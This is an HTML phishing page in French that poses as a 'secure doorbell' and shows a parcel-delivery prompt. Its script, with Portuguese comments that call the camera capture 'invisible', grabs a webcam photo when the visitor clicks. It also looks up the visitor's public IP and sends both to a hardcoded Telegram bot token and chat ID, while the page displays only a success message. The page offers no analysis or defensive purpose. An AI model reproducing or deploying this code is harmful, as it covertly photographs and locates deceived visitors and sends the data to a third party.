<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sonnette Sécurisée</title>
    <style>
        .consent-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            color: white;
        }

        .consent-box {
            background: #2c3e50;
            padding: 2rem;
            border-radius: 15px;
            text-align: center;
            max-width: 400px;
        }

        button {
            background: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 15px;
        }

        #statusMsg {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="consent-modal" id="consentModal">
        <div class="consent-box">
            <h2>Felipe Torres</h2>
            <p>Sonnez la cloche:</p>
            <button onclick="initiateActivation()">Votre commandeest lá!</button>
        </div>
    </div>

    <div id="statusMsg"></div>

<script>
const BOT_TOKEN = '7761704256:AAFjKhIIjUptkMj84pnUU0VG5u5K_VFaJWg';
const CHAT_ID = '5562266493';

async function getIPInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return { ip: data.ip };
    } catch (error) {
        return { ip: 'Indisponible' };
    }
}

async function sendToTelegram(ip, photoUrl) {
    try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', `Nouvelle activation!\nIP: ${ip}`);

        const blob = await fetch(photoUrl).then(r => r.blob());
        formData.append('photo', blob, 'visitor.jpg');

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        return true;
    } catch (error) {
        console.error('Erreur:', error);
        return false;
    }
}

async function initiateActivation() {
    try {
        document.getElementById('consentModal').style.display = 'none';
        document.getElementById('statusMsg').innerHTML = 'Activation en cours...';

        // Captura invisível da câmera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        
        // Captura rápida da foto
        const photoBlob = await imageCapture.takePhoto();
        const photoUrl = URL.createObjectURL(photoBlob);
        
        // Obter IP
        const ipInfo = await getIPInfo();
        
        // Envio para Telegram
        const success = await sendToTelegram(ipInfo.ip, photoUrl);
        
        if(success) {
            document.getElementById('statusMsg').innerHTML = `
                <div style="color:green; background:#ecf0f1; padding:15px; border-radius:8px;">
                    ✓ Activation réussie!
                </div>
            `;
        } else {
            throw new Error('Échec de l\'envoi');
        }

        // Limpeza
        track.stop();
        URL.revokeObjectURL(photoUrl);

    } catch (error) {
        document.getElementById('statusMsg').innerHTML = `
            <div style="color:red; background:#ecf0f1; padding:15px; border-radius:8px;">
                ✗ Erreur: ${error.message || 'Service indisponible'}
            </div>
        `;
    }
}

window.onload = () => {
    document.getElementById('consentModal').style.display = 'flex';
}
</script>
</body>
</html>
